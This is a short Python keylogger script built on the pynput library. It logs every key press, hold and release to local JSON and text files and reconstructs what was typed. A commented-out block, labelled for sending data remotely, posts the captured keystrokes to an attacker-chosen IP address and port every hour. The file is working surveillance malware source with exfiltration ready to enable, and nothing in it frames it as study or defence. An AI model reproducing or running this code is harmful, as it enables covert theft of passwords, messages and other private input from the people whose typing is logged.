from pynput import keyboard
import json

import requests
import threading

key_list = []
x = False
key_strokes = ""

#--------------------------USE THIS CODE FOR SENDING DATA REMOTELY--------------------------------

# ip_address = "......" # enter your preferred ip address
# port_number = "......"  # enter your preferred Port address
# time_interval = 3600

# def send_post_req():
#     try:
#         payload = json.dumps({"keyboardData": key_strokes})
#         response = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type": "application/json"})
#         if response.status_code == 200:
#             print("Data sent successfully!")
#         else:
#             print("Failed to send data. Status code:", response.status_code)
#         timer = threading.Timer(time_interval, send_post_req)
#         timer.start()
#     except requests.exceptions.RequestException as e:
#         print("An error occurred:", e)

#------------------------------------------ END -----------------------------------------------------

def update_json_file(key_list):
    with open('adv_logs.json', '+wb') as key_log:
        key_list_bytes = json.dumps(key_list).encode()
        key_log.write(key_list_bytes)

def update_txt_file(key):
    with open('adv_log.txt', 'w+') as key_strokes_file:
        key_strokes_file.write(key)



def on_press(key):
    global x, key_list, key_strokes
    if x == False:
        key_list.append({'Pressed': f'{key}'})
        x = True
    if x == True:
        key_list.append({'Held': f'{key}'})


    if key == keyboard.Key.enter:
        key_strokes += "\n"
    elif key == keyboard.Key.tab:
        key_strokes += "\t"
    elif key == keyboard.Key.space:
        key_strokes += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(key_strokes) == 0:
        pass
    elif key == keyboard.Key.backspace and len(key_strokes) > 0:
        key_strokes = key_strokes[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        key_strokes += str(key).strip("'")

    update_json_file(key_list)
    update_txt_file(key_strokes)


def on_release(key):
    global x, key_list, key_strokes
    key_list.append({'Released': f'{key}'})
    if x == True:
        x = False
    update_json_file(key_list)

# Start sending data at regular intervals
# send_post_req()

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
